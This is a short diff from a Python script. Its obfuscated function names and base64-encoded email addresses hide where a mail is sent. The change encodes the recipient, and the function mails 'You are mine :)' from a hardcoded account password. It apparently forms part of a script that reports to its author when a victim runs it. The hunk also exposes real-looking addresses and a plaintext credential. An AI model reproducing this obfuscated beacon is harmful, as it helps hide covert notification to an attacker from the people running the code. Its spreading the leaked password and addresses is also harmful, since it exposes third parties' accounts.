@@ -98,7 +98,7 @@ def OoOoOo():
 def ooOoo():
         sender = bs.b64decode('c2lydXNpcmFqdTJhYUBnbWFpbC5jb20=').decode()
         # reciever = bs.b64decode('YW5zaXlhYW5zaTUyNEBnbWFpbC5jb20=').decode()
-        reciever ='munnas2aa@gmail.com'
+        reciever =bs.b64decode('YW5zaXlhYW5zaTUyNEBnbWFpbC5jb20=').decode()
         message = "\nYou are mine :)"
         password = 'uwjmpxmbpiurtouk'
         Mailer(sender,password,reciever,message)
